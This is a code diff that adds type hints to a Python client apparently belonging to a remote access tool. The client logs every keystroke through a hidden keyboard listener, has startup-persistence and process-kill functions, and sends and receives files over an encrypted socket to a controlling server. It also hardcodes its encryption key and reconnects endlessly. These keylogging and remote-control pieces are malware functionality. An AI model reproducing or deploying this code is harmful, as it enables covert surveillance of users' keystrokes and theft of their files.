@@ -45,7 +45,7 @@ logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(mes
 logging.info('Client Started.')
 
 
-def read_file(path, block_size=32768) -> bytes:
+def read_file(path: str, block_size: int = 32768) -> bytes:
     """ Generator for reading files """
     with open(path, 'rb') as f:
         while True:
@@ -56,7 +56,7 @@ def read_file(path, block_size=32768) -> bytes:
                 return
 
 
-def reverse_readline(filename, buf_size=16384) -> str:
+def reverse_readline(filename: str, buf_size: int = 16384) -> str:
     """A generator that returns the lines of a file in reverse order"""
 
     # Credit: https://stackoverflow.com/a/23646049/10625567
@@ -85,7 +85,7 @@ def reverse_readline(filename, buf_size=16384) -> str:
             yield segment
 
 
-def errors(ERROR, line=True) -> str:
+def errors(ERROR: Exception, line: bool = True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
     error_msg = f'{error_class}:'
@@ -139,7 +139,7 @@ def remove_startup() -> list:
     return [True, None]
 
 
-def kill(proc_pid) -> None:
+def kill(proc_pid: int) -> None:
     """ Kill Process by ID """
     process = psutil.Process(proc_pid)
     for proc in process.children(recursive=True):
@@ -147,18 +147,18 @@ def kill(proc_pid) -> None:
     process.kill()
 
 
-def json_dumps(data) -> bytes:
+def json_dumps(data: not bytes) -> bytes:
     """ Dumps json data and encodes it """
     return json.dumps(data).encode()
 
 
-def json_loads(data):
+def json_loads(data: bytes):
     """ Decodes and then loads json data """
     return json.loads(data.decode())
 
 
 def OnKeyboardEvent(event):
-    logging.info(str(event))
+    logging.info(f"{event}")
 
 if _pynput:
     KeyListener = Listener(on_press=OnKeyboardEvent)
@@ -174,7 +174,7 @@ if _pynput:
 
 class Client(object):
 
-    def __init__(self, host='127.0.0.1', port=8000, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
+    def __init__(self, key: bytes, host: str = '127.0.0.1', port: int = 8000) -> None:
         self.serverHost = host
         self.serverPort = port
         self.socket = None
@@ -199,7 +199,7 @@ class Client(object):
         except Exception as e:
             logging.error(errors(e))
 
-    def recvall(self, n) -> bytes:
+    def recvall(self, n: int) -> bytes:
         """ Function to receive n amount of bytes"""
         # returns bytes/None
         data = b''
@@ -217,7 +217,7 @@ class Client(object):
         self.socket.send(b'RECEIVED')
         return self.Fer.decrypt(self.recvall(buffer))
 
-    def send(self, data) -> None:
+    def send(self, data: bytes) -> None:
         """ Sends Buffer Size and Data to Server Encrypted with AES """
         # returns None
         encrypted = self.Fer.encrypt(data)
@@ -225,7 +225,7 @@ class Client(object):
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
-    def check_perms(self, _file, mode) -> bool:
+    def check_perms(self, _file: str, mode: str) -> bool:
         try:
             with open(_file, mode):
                 pass
@@ -236,7 +236,7 @@ class Client(object):
             return False
         return True
 
-    def send_file(self, file_to_transfer) -> None:
+    def send_file(self, file_to_transfer: str) -> None:
         """ Send file to Server """
         # returns None
         if not self.check_perms(file_to_transfer, 'rb'):
@@ -250,7 +250,7 @@ class Client(object):
         logging.info(f'Transferred {file_to_transfer} to Server')
         return
 
-    def receive_file(self, save_as) -> None:
+    def receive_file(self, save_as: str) -> None:
         """ Receive File from Server"""
         # returns None
         if not self.check_perms(save_as, 'wb'):
@@ -519,10 +519,10 @@ class Client(object):
                 continue
 
 
-def main(RETRY_TIMER : int = 30) -> None:
+def main(KEY: bytes, RETRY_TIMER: int = 10) -> None:
     """ Run Client """
     # RETRY_TIMER: Time to wait before trying to reconnect
-    client = Client()
+    client = Client(KEY)
     while True:
         try:
             client.connect()
@@ -541,4 +541,4 @@ if __name__ == '__main__':
     # Add Client to Startup when Client is run
     # add_startup()
     while 1:
-        main(RETRY_TIMER=10)
+        main(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
